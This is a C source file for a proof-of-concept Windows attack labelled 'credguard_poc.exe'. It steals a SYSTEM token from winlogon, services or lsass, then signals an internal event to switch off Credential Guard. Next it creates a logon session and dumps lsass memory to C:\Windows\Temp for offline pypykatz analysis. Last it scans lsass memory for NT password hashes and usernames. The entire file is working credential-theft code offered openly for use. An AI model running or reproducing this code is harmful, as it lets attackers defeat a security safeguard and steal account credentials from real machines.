#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <ntsecapi.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(s)  ((NTSTATUS)(s) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x40UL
#endif
#define EVENT_MODIFY_STATE 0x0002

typedef NTSTATUS (WINAPI *pfn_NtOpenEvent)(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES *);
typedef NTSTATUS (WINAPI *pfn_NtSetEvent)(HANDLE, PULONG);
typedef VOID     (WINAPI *pfn_RtlInitUnicodeString)(UNICODE_STRING *, PCWSTR);

typedef DWORD MINIDUMP_TYPE;
#define MiniDumpWithFullMemory             0x00000002
#define MiniDumpWithFullMemoryInfo         0x00000800
#define MiniDumpWithHandleData             0x00000004
#define MiniDumpWithPrivateReadWriteMemory 0x00008000
typedef BOOL (WINAPI *pfn_MiniDumpWriteDump)(HANDLE, DWORD, HANDLE,
    MINIDUMP_TYPE, PVOID, PVOID, PVOID);

#define PRIMARY_NTHASH_OFFSET   0x1F6
#define PRIMARY_USERNAME_OFFSET 0x18E

static BOOL enable_debug_privilege(void) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(hToken); return FALSE;
    }
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

static DWORD find_pid(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

static HANDLE impersonate_system(void) {
    const wchar_t *candidates[] = {
        L"winlogon.exe",
        L"services.exe",
        L"lsass.exe",
        NULL
    };

    for (int i = 0; candidates[i]; i++) {
        DWORD pid = find_pid(candidates[i]);
        if (!pid) {
            printf("  [~] %ls not found, trying next\n", candidates[i]);
            continue;
        }

        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) {
            printf("  [~] OpenProcess(%ls, %lu): %lu - trying next\n",
                   candidates[i], pid, GetLastError());
            continue;
        }

        HANDLE hTok = NULL;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok)) {
            printf("  [~] OpenProcessToken(%ls): %lu - trying next\n",
                   candidates[i], GetLastError());
            CloseHandle(hProc);
            continue;
        }
        CloseHandle(hProc);

        HANDLE hDup = NULL;
        if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                              SecurityImpersonation, TokenImpersonation, &hDup)) {
            printf("  [~] DuplicateTokenEx(%ls): %lu - trying next\n",
                   candidates[i], GetLastError());
            CloseHandle(hTok);
            continue;
        }
        CloseHandle(hTok);

        if (!ImpersonateLoggedOnUser(hDup)) {
            printf("  [~] ImpersonateLoggedOnUser(%ls): %lu - trying next\n",
                   candidates[i], GetLastError());
            CloseHandle(hDup);
            continue;
        }

        printf("  [+] Thread impersonating SYSTEM via %ls (PID %lu)\n",
               candidates[i], pid);
        return hDup;
    }

    printf("  [!] All SYSTEM impersonation candidates exhausted: %lu\n", GetLastError());
    return NULL;
}

static void revert_impersonation(HANDLE hDup) {
    RevertToSelf();
    if (hDup) CloseHandle(hDup);
    printf("  [+] Reverted to process token\n");
}

#define CREDGUARD_EVENT_SIGNALED  1
#define CREDGUARD_EVENT_NOT_FOUND 0
#define CREDGUARD_EVENT_ERROR    -1

static int signal_credguard_event(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pfn_NtOpenEvent          NtOpenEvent          = (pfn_NtOpenEvent)
        GetProcAddress(ntdll, "NtOpenEvent");
    pfn_NtSetEvent           NtSetEvent           = (pfn_NtSetEvent)
        GetProcAddress(ntdll, "NtSetEvent");
    pfn_RtlInitUnicodeString RtlInitUnicodeString = (pfn_RtlInitUnicodeString)
        GetProcAddress(ntdll, "RtlInitUnicodeString");

    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"\\LSA_ISO_DISABLE_CREDENTIAL_GUARD");
    OBJECT_ATTRIBUTES oa = {
        .Length     = sizeof(OBJECT_ATTRIBUTES),
        .ObjectName = &name,
        .Attributes = OBJ_CASE_INSENSITIVE
    };

    HANDLE hEvent = NULL;
    NTSTATUS st = NtOpenEvent(&hEvent, EVENT_MODIFY_STATE, &oa);
    if ((ULONG)st == 0xC0000034UL) {
        printf("  [~] Event not found - CredGuard already off (lsaiso cleaned up)\n");
        return CREDGUARD_EVENT_NOT_FOUND;
    }
    if (!NT_SUCCESS(st)) {
        printf("  [!] NtOpenEvent -> 0x%08X (VBS off, or impersonation didn't land?)\n", (UINT)st);
        return CREDGUARD_EVENT_ERROR;
    }
    ULONG prev = 0;
    st = NtSetEvent(hEvent, &prev);
    CloseHandle(hEvent);
    if (!NT_SUCCESS(st)) {
        printf("  [!] NtSetEvent -> 0x%08X\n", (UINT)st);
        return CREDGUARD_EVENT_ERROR;
    }
    printf("  [+] NtSetEvent -> STATUS_SUCCESS (prev state=%lu)\n", prev);
    return CREDGUARD_EVENT_SIGNALED;
}

static BOOL compute_nt_hash(const char *password, BYTE hash_out[16]) {
    int wlen = MultiByteToWideChar(CP_ACP, 0, password, -1, NULL, 0) - 1;
    if (wlen <= 0) { memset(hash_out, 0, 16); return FALSE; }
    wchar_t *wpass = (wchar_t *)malloc((wlen + 1) * 2);
    if (!wpass) return FALSE;
    MultiByteToWideChar(CP_ACP, 0, password, -1, wpass, wlen + 1);

    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL ok = FALSE;

    if (CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_MD4, 0, 0, &hHash)) {
            DWORD hashLen = 16;
            if (CryptHashData(hHash, (BYTE *)wpass, (DWORD)(wlen * 2), 0) &&
                CryptGetHashParam(hHash, HP_HASHVAL, hash_out, &hashLen, 0))
                ok = TRUE;
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    SecureZeroMemory(wpass, wlen * 2);
    free(wpass);
    return ok;
}

static void scan_for_nt_hash(HANDLE hLsass, const BYTE *expected_hash) {
    printf("\n[Stage 8] Scanning lsass memory for NT hash\n");
    printf("  [*] MD4(UTF-16LE(pass)) = ");
    for (int i = 0; i < 16; i++) printf("%02x", expected_hash[i]);
    printf("\n");

    MEMORY_BASIC_INFORMATION mbi;
    ULONG_PTR addr = 0;
    int found = 0;

    while (VirtualQueryEx(hLsass, (LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        BOOL readable = (mbi.State  == MEM_COMMIT)
                     && (mbi.Type   == MEM_PRIVATE)
                     && !(mbi.Protect & (PAGE_NOACCESS | PAGE_GUARD))
                     && (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY
                                        | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE));

        if (readable && mbi.RegionSize <= 16 * 1024 * 1024) {
            BYTE *buf = (BYTE *)malloc(mbi.RegionSize);
            SIZE_T nread = 0;
            if (buf && ReadProcessMemory(hLsass, mbi.BaseAddress,
                                         buf, mbi.RegionSize, &nread)) {
                for (SIZE_T off = 0; off + 16 <= nread; off++) {
                    if (memcmp(buf + off, expected_hash, 16) != 0) continue;

                    ULONG_PTR hash_va = (ULONG_PTR)mbi.BaseAddress + off;
                    ULONG_PTR cred_va = hash_va - PRIMARY_NTHASH_OFFSET;
                    found++;

                    printf("  [+] NT hash @ VA 0x%016llX  (MSV1_0_PRIMARY_CREDENTIAL @ 0x%016llX)\n",
                           (unsigned long long)hash_va, (unsigned long long)cred_va);
                    printf("      NtOwfPassword : ");
                    for (int i = 0; i < 16; i++) printf("%02x", buf[off + i]);
                    printf("\n");

                    if (off >= PRIMARY_NTHASH_OFFSET) {
                        SIZE_T user_off = off - PRIMARY_NTHASH_OFFSET + PRIMARY_USERNAME_OFFSET;
                        if (user_off + 28 <= nread) {
                            wchar_t uname[16] = {0};
                            memcpy(uname, buf + user_off, 14);
                            printf("      UserName (+0x18E) : %ls\n", uname);
                        }
                    }
                }
            }
            free(buf);
        }

        if (addr + mbi.RegionSize <= addr) break;
        addr += mbi.RegionSize;
    }

    if (found == 0)
        printf("  [-] NT hash not found - CredGuard may still be active,\n"
               "      or this session type stores creds elsewhere.\n");
    else
        printf("  [+] %d hit(s) - NT hash accessible in VTL0 after CredGuard shutdown!\n", found);
}

static HANDLE create_interactive_logon(LUID *out_luid, const char *user, const char *domain, const char *pass) {
    HANDLE hToken = NULL;
    if (!LogonUserA(user, domain, pass,
                    LOGON32_LOGON_INTERACTIVE,
                    LOGON32_PROVIDER_DEFAULT,
                    &hToken)) {
        printf("  [!] LogonUserA failed: %lu\n", GetLastError());
        return NULL;
    }
    TOKEN_STATISTICS ts;
    DWORD needed = 0;
    if (!GetTokenInformation(hToken, TokenStatistics, &ts, sizeof(ts), &needed)) {
        printf("  [!] GetTokenInformation: %lu\n", GetLastError());
        CloseHandle(hToken); return NULL;
    }
    *out_luid = ts.AuthenticationId;
    printf("  [+] New interactive session LUID = {0x%08lX, 0x%08lX}\n",
           out_luid->HighPart, out_luid->LowPart);
    return hToken;
}

static BOOL dump_lsass(HANDLE hLsass, DWORD lsassPid, const wchar_t *path) {
    HMODULE hDbg = LoadLibraryW(L"dbghelp.dll");
    if (!hDbg) { printf("  [!] LoadLibrary(dbghelp.dll) failed\n"); return FALSE; }

    pfn_MiniDumpWriteDump MiniDumpWriteDump =
        (pfn_MiniDumpWriteDump)GetProcAddress(hDbg, "MiniDumpWriteDump");
    if (!MiniDumpWriteDump) { FreeLibrary(hDbg); return FALSE; }

    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("  [!] CreateFile for dump: %lu\n", GetLastError());
        FreeLibrary(hDbg);
        return FALSE;
    }

    DWORD dumpType = MiniDumpWithFullMemory
                   | MiniDumpWithFullMemoryInfo
                   | MiniDumpWithHandleData
                   | MiniDumpWithPrivateReadWriteMemory;

    BOOL ok = MiniDumpWriteDump(hLsass, lsassPid, hFile,
                                (MINIDUMP_TYPE)dumpType, NULL, NULL, NULL);
    if (!ok) printf("  [!] MiniDumpWriteDump: %lu\n", GetLastError());

    CloseHandle(hFile);
    FreeLibrary(hDbg);
    return ok;
}

int main(int argc, char **argv) {
    const char *user   = (argc > 1) ? argv[1] : "sshuser";
    const char *domain = (argc > 2) ? argv[2] : ".";
    const char *pass   = (argc > 3) ? argv[3] : "password";

    printf("=== credguard_poc.exe  (Win11 24H2 / build 26200) ===\n\n");

    // Stage 0: enable SeDebugPrivilege and impersonate SYSTEM
    printf("[Stage 0] Elevate privileges + impersonate SYSTEM\n");
    if (!enable_debug_privilege())
        printf("  [!] SeDebugPrivilege failed (%lu) - token theft may fail\n", GetLastError());
    else
        printf("  [+] SeDebugPrivilege enabled\n");

    HANDLE hSystemToken = impersonate_system();
    if (!hSystemToken) {
        printf("  [!] Fatal: could not impersonate SYSTEM\n");
        return 1;
    }

    // Stage 1: signal CredGuard disable event as SYSTEM
    printf("\n[Stage 1] Signal \\LSA_ISO_DISABLE_CREDENTIAL_GUARD  (as SYSTEM)\n");
    int sig = signal_credguard_event();

    // Stage 0b: revert SYSTEM impersonation
    printf("\n[Stage 0b] Revert SYSTEM impersonation\n");
    revert_impersonation(hSystemToken);

    if (sig == CREDGUARD_EVENT_ERROR) {
        printf("  [!] Fatal: event signaling failed (VBS not active?)\n");
        return 1;
    }
    if (sig == CREDGUARD_EVENT_NOT_FOUND)
        printf("  [~] Skipping wait - CredGuard already off\n");

    // Stage 2: wait 3s for CredGuard teardown
    printf("\n[Stage 2] Waiting for CredGuard teardown\n");
    if (sig == CREDGUARD_EVENT_SIGNALED) {
        printf("  [~] Sleeping 3s for DisableCredGuardWaitThread to complete...\n");
        Sleep(3000);
        printf("  [+] Resumed - CredGuard should be OFF (verify: WMI Win32_DeviceGuard.SecurityServicesRunning == 0)\n");
    } else {
        printf("  [~] Skipped (CredGuard was already off)\n");
    }

    // Stage 3: SeDebugPrivilege already active on process token from Stage 0
    printf("\n[Stage 3] SeDebugPrivilege (enabled in Stage 0 - still active on process token)\n");

    // Stage 4: create interactive logon and get session LUID
    printf("\n[Stage 4] Creating interactive logon session (user=%s domain=%s)\n", user, domain);
    LUID session_luid = {0};
    HANDLE hNewToken = create_interactive_logon(&session_luid, user, domain, pass);
    if (!hNewToken) {
        printf("  [!] Logon failed - check credentials\n");
        return 1;
    }

    // Stage 6: open lsass handle
    printf("\n[Stage 6] Opening lsass\n");
    DWORD lsassPid = find_pid(L"lsass.exe");
    if (!lsassPid) { printf("  [!] lsass.exe not found\n"); return 1; }
    printf("  [+] lsass PID = %lu\n", lsassPid);

    HANDLE hLsass = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        FALSE, lsassPid);
    if (!hLsass) {
        printf("  [!] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("  [+] Opened lsass handle\n");

    // Stage 7: minidump lsass to disk
    printf("\n[Stage 7] MiniDumpWriteDump -> C:\\Windows\\Temp\\lsass_post.dmp\n");
    if (dump_lsass(hLsass, lsassPid, L"C:\\Windows\\Temp\\lsass_post.dmp"))
        printf("  [+] Dump written - analyze offline: pypykatz lsa minidump lsass_post.dmp\n");
    else
        printf("  [-] Dump failed (Defender still blocking?)\n");

    // Stage 8: compute NT hash and scan lsass memory
    printf("\n[Stage 8] Computing NT hash and scanning lsass\n");
    BYTE nt_hash[16] = {0};
    if (!compute_nt_hash(pass, nt_hash)) {
        printf("  [!] MD4 computation failed (PROV_RSA_FULL CALG_MD4 unavailable?)\n");
        printf("      Offline: pypykatz lsa minidump lsass_post.dmp\n");
    } else {
        scan_for_nt_hash(hLsass, nt_hash);
    }

    (void)session_luid;

    CloseHandle(hLsass);
    CloseHandle(hNewToken);

    printf("\n[done]\n");
    return 0;
}
